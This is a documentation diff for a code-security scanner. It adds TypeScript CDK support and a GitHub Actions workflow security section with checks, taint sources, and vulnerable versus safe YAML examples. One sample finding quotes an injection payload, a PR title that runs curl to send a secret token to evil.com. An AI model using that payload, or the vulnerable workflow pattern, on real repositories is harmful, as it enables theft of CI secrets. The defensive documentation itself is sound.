@@ -769,11 +769,11 @@ aud terraform analyze
 
 ### AWS CDK Infrastructure Analysis
 
-Analyze AWS Cloud Development Kit (Python) configurations for infrastructure security issues before deployment.
+Analyze AWS Cloud Development Kit (Python, TypeScript, JavaScript) configurations for infrastructure security issues before deployment.
 
 **Prerequisites:**
 ```bash
-# CDK Python files are automatically indexed
+# CDK files (Python, TypeScript, JavaScript) are automatically indexed
 aud index
 ```
 
@@ -865,13 +865,219 @@ aud full  # Includes CDK analyze (Stage 2, after Terraform)
 - S3 public exposure prevention
 
 **Detected Constructs:**
-- `s3.Bucket` - S3 bucket configurations
-- `rds.DatabaseInstance` - RDS database instances
-- `ec2.SecurityGroup` - EC2 security groups
-- `ec2.Volume` - EBS volumes
-- `dynamodb.Table` - DynamoDB tables
-- `iam.PolicyStatement` - IAM policy statements
-- `iam.Role` - IAM roles with managed policies
+Supports both Python and TypeScript/JavaScript CDK code:
+- `s3.Bucket` - S3 bucket configurations (Python + TypeScript)
+- `rds.DatabaseInstance` - RDS database instances (Python + TypeScript)
+- `ec2.SecurityGroup` - EC2 security groups (Python + TypeScript)
+- `ec2.Volume` - EBS volumes (Python + TypeScript)
+- `dynamodb.Table` - DynamoDB tables (Python + TypeScript)
+- `iam.PolicyStatement` - IAM policy statements (Python + TypeScript)
+- `iam.Role` - IAM roles with managed policies (Python + TypeScript)
+
+**Language Support:**
+- **Python**: Extracts from `aws_cdk.aws_*` and direct imports (CDK v2)
+- **TypeScript**: Extracts from `aws-cdk-lib/aws-*` imports and `new` expressions
+- **JavaScript**: Same as TypeScript (uses same extraction pipeline)
+
+### GitHub Actions Workflow Security
+
+Analyze GitHub Actions workflows for supply-chain vulnerabilities, privilege escalation, and CI/CD pipeline attack patterns.
+
+**Prerequisites:**
+```bash
+# Workflow files are automatically indexed
+aud index
+```
+
+**Security Analysis:**
+```bash
+# Detect all workflow security issues
+aud workflows analyze
+
+# Filter by severity
+aud workflows analyze --severity critical
+
+# Export findings to JSON
+aud workflows analyze --output workflow_security.json
+```
+
+**Security Checks:**
+
+1. **Untrusted Code Execution**
+   - `pull_request_target` with early checkout of untrusted PR code
+   - Checkout of `github.event.pull_request.head.sha` before validation
+   - Severity: CRITICAL/HIGH
+
+2. **Script Injection**
+   - PR metadata (title, body, branch names) interpolated into shell scripts
+   - github.event.* data used directly in `run:` scripts without sanitization
+   - Attacker-controlled strings in bash commands
+   - Severity: CRITICAL/HIGH
+
+3. **Unpinned Actions with Secrets**
+   - Mutable action versions (@main, @v1) that expose secrets
+   - Third-party actions using floating tags with `secrets:` access
+   - Supply chain takeover risk through action updates
+   - Severity: HIGH
+
+4. **Excessive Permissions**
+   - Write permissions (`contents`, `packages`, `id-token`) in untrusted contexts
+   - Overly permissive GITHUB_TOKEN in pull_request_target workflows
+   - Permission escalation via workflow_dispatch
+   - Severity: CRITICAL/HIGH
+
+5. **External Workflow Risks**
+   - Reusable workflows from external repos with `secrets: inherit`
+   - Third-party workflows accessing organizational secrets
+   - Information disclosure to external systems
+   - Severity: HIGH/MEDIUM
+
+6. **Artifact Poisoning**
+   - Untrusted builds deployed without validation
+   - Artifacts from pull_request_target uploaded and later deployed
+   - Build artifacts from forked PRs used in production
+   - Severity: CRITICAL
+
+**Attack Patterns Covered:**
+
+- **CWE-284**: Improper Access Control (untrusted checkout sequences)
+- **CWE-829**: Untrusted Supply Chain (unpinned third-party actions)
+- **CWE-77**: Command Injection (PR data in run scripts)
+- **CWE-269**: Privilege Management (excessive workflow permissions)
+- **CWE-200**: Information Exposure (secret leaks to external workflows)
+- **CWE-494**: Integrity Check Missing (artifact poisoning chains)
+
+**Example Output:**
+```
+GitHub Actions Security Analysis Complete:
+  Total findings: 7
+  Critical: 3
+  High: 4
+  Medium: 0
+  Low: 0
+
+Sample findings:
+
+  [CRITICAL] Workflow 'CI' job 'test' step 'Checkout PR' checks out untrusted code in pull_request_target context
+  File: .github/workflows/ci.yml
+  Pattern: pull_request_target + early checkout
+  Attack: Attacker opens PR with malicious code that executes with write permissions
+  Remediation: Move checkout after validation, or use pull_request trigger instead
+
+  [CRITICAL] Workflow 'CI' job 'test' step 'Run tests' uses untrusted data in run: script without sanitization
+  File: .github/workflows/ci.yml
+  Variables: github.event.pull_request.title, github.event.pull_request.body
+  Attack Example: PR title "; curl http://evil.com/steal?token=$SECRET #" executes arbitrary commands
+  Remediation: Pass untrusted data through environment variables, not direct interpolation
+
+  [HIGH] Workflow 'Publish' uses unpinned action 'actions/checkout@main' with secrets access
+  File: .github/workflows/publish.yml
+  Risk: Action maintainer can update @main to steal NPM_TOKEN
+  Remediation: Pin to full SHA (actions/checkout@a1b2c3d4...) or use verified actions only
+```
+
+**Integration with Full Pipeline:**
+
+GitHub Actions analysis is automatically included in `aud full`:
+```bash
+aud full  # Includes workflow analyze (Phase 20/26, after CDK)
+```
+
+**Taint Integration:**
+
+GitHub Actions analysis registers PR/issue data as taint sources and shell execution as sinks:
+```bash
+# PR data flows to shell commands detected as injection vulnerabilities
+aud taint-analyze  # Includes workflow-specific taint patterns
+```
+
+Taint sources include:
+- `github.event.pull_request.title`
+- `github.event.pull_request.body`
+- `github.event.pull_request.head.ref` (branch names)
+- `github.event.issue.title`
+- `github.event.issue.body`
+- `github.event.comment.body`
+- `github.head_ref`
+
+Taint sinks include:
+- `run:` scripts in workflow steps
+- Shell commands (bash, sh, pwsh)
+- Command execution contexts
+
+**Output Locations:**
+- `.pf/raw/github_workflows.json` - Workflow structure and metadata (JSON)
+- `.pf/raw/patterns.json` - Includes workflow security findings (detect-patterns integration)
+- `.pf/readthis/github_workflows_*.md` - AI-optimized chunks (<65KB)
+- `findings_consolidated` table - Cross-tool correlation with application code findings
+
+**When to Use:**
+- CI/CD security audits before deployment
+- Supply chain security reviews
+- Preventing privilege escalation in workflows
+- Detecting script injection vulnerabilities
+- Validating third-party action usage
+- Securing artifact deployment pipelines
+
+**Common Vulnerable Patterns:**
+```yaml
+# VULNERABLE: pull_request_target + early checkout
+on: pull_request_target
+jobs:
+  test:
+    steps:
+      - uses: actions/checkout@v4  # VULN: Checks out attacker code with write token
+
+# SAFE: pull_request_target + late checkout after validation
+on: pull_request_target
+jobs:
+  test:
+    steps:
+      - name: Validate PR
+        run: # ... validation logic ...
+      - uses: actions/checkout@v4  # Safe: After validation
+
+# VULNERABLE: PR data in run script
+- name: Comment on PR
+  run: echo "PR title: ${{ github.event.pull_request.title }}"  # VULN: Injection
+
+# SAFE: PR data via environment variables
+- name: Comment on PR
+  env:
+    PR_TITLE: ${{ github.event.pull_request.title }}
+  run: echo "PR title: $PR_TITLE"  # Safe: Shell interpolation, not command injection
+```
+
+**Example Workflow Analysis:**
+```bash
+# 1. Index workflows
+aud index
+
+# 2. Run security analysis
+aud workflows analyze --severity critical
+
+# 3. View detailed findings
+cat .pf/raw/github_workflows.json | jq '.findings[] | select(.severity=="CRITICAL")'
+
+# 4. Check specific workflow
+aud workflows analyze | grep "ci.yml"
+
+# 5. Export for security review
+aud workflows analyze --format json --output security_review.json
+```
+
+**FCE Correlation:**
+
+Workflow findings are correlated with application code vulnerabilities by the Factual Correlation Engine:
+```bash
+# Example: Workflow uses unpinned npm action + package.json has vulnerable dependency
+aud full  # FCE detects compound supply-chain risk
+```
+
+Correlation patterns include:
+- Workflow + taint path correlation (PR data to SQL injection)
+- Workflow + dependency vulnerability (unpinned action + CVE)
+- Workflow + permission escalation (excessive GITHUB_TOKEN + admin API call)
 
 ### Control Flow Graph Analysis
 
